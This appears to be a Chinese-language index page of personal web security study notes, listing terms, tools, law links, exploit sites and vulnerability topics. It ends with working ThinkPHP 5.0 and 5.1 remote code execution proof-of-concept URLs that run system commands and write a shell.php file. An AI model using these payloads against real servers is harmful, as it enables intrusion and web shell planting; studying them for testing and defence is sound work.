# web安全

## 安全的常用术语

- vul：vulnerable：漏洞
- payload：ShellCode中的主要功能代码
- POC：Proof ofConcept：漏洞证明
- EXP：Exploit：漏洞利用
- CVE漏洞编号：Common Vulnerabilities & Exposures 公开的漏洞
- XSS Cheat Sheet: xss备忘单

## 浏览器插件

- SwitchyOmega
- Shodan
- FOFA Pro View
- IP, DNS & Security Tools / HackerTarget.com
- wappalyzer
- XPath Helper
- 迅雷下载

## 网络安全法

- [中华人民共和国网络安全法](http://www.xinhuanet.com/politics/2016-11/07/c_1119867015.htm)
- [T00ls法律讲堂](https://www.t00ls.net/Law-articles.html)

## 网站

- [渗透师导航](https://www.shentoushi.top/)
- [exploit-db](https://www.exploit-db.com/)
- [hackthebox](https://www.hackthebox.eu/)
- [exp库](http://expku.com/)

## [信息收集](./1信息收集/信息收集.html)

## 常见漏洞

- [xss速查表](./2漏洞/xss速查表.html)
- [sql injection](./2漏洞/sql/sql注入进阶.html)
- [文件上传漏洞](./2漏洞/文件上传漏洞.html)
- [PHP反序列化](./2漏洞/PHP反序列化漏洞.html)
- [逻辑漏洞](./2漏洞/逻辑漏洞.html)

## 工具

- [nmap](./3工具/nmap.html)

## 通用漏洞

## ThinkPHP5.0和5.1版本远程代码执行分析

```poc
5.0版本POC（不唯一）:
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
命令执行：?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=[系统命令]
文件写入：?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][1]=<?php phpinfo();?>

5.1版本POC（不唯一）
?s=index/\think\Request/input&filter=phpinfo&data=1
命令执行：?s=index/\think\Request/input&filter=system&data=[系统命令]
文件写入：?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
```

- [WinRAR目录穿越漏洞（CVE-2018-20250）](https://github.com/WyAtu/CVE-2018-20250)
- [IIS短文件漏洞](https://github.com/lijiejie/IIS_shortname_Scanner)